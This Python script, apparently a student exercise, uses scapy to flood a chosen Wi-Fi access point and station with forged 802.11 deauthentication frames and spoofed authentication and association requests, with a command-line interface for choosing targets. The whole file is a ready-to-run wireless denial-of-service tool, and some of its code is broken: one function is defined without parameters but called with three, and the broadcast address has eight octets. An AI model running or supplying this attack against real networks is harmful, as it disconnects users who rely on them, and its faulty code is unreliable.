from scapy.all import Dot11,RadioTap,sendp,RandMAC,Dot11Deauth,Dot11Auth,Dot11AssoReq,Dot11Elt
import argparse
import time
from multiprocessing import *

def deauth_broadcast(iface: str, ap: str):
  # AP broadcast
  dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff:ff:ff", addr2=ap, addr3=ap)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)
  
def deauth_ap():
  # AP unicast
  dot11 = Dot11(addr1=station, addr2=ap, addr3=ap)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)

def deauth_station(iface: str, ap: str, station: str): # It's not in the option, but I've implemented it.
  # Station unicast
  dot11 = Dot11(addr1=ap, addr2=station, addr3=ap)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)
  
def auth(iface: str, ap: str, station: str):
  dot11 = Dot11(addr1=ap, addr2=station, addr3=ap)
  frame = RadioTap()/dot11/Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
  sendp(frame, iface=iface, loop=10,inter=0.00100)
    
def asso(iface: str, ap: str, station: str):
  dot11 = Dot11(addr1=ap, addr2=station, addr3=ap)
  frame = RadioTap()/dot11/Dot11AssoReq(cap=0x1100, listen_interval=0x00a)/Dot11Elt(ID=0, info="MY_BSSID") # Modify cap value after packet verification
  sendp(frame, iface=iface, loop=10,inter=0.00100)

if __name__ == "__main__":
  parser = argparse.ArgumentParser()    
  parser.add_argument("interface")
  parser.add_argument("ap",metavar="MAC")
  parser.add_argument("-s","--station", metavar="MAC",help='')
  parser.add_argument("-auth",action='store_true',help='')
  args = parser.parse_args()
  if args.auth:
    if args.interface and args.ap and args.station:
      p_a = Process(target=auth,args=(args.interface, args.ap, args.station))
      p_b = Process(target=asso,args=(args.interface, args.ap, args.station))
      p_a.start()
      p_b.start()
      p_a.join()
      p_b.join()
    else:
      print('Please match the args format.')
  else:
    if args.interface and args.ap and args.station:
      deauth_ap(args.interface, args.ap, args.station)
    elif args.interface and args.ap:
      deauth_broadcast(args.interface, args.ap)
    else:
      print('Please match the args format.')
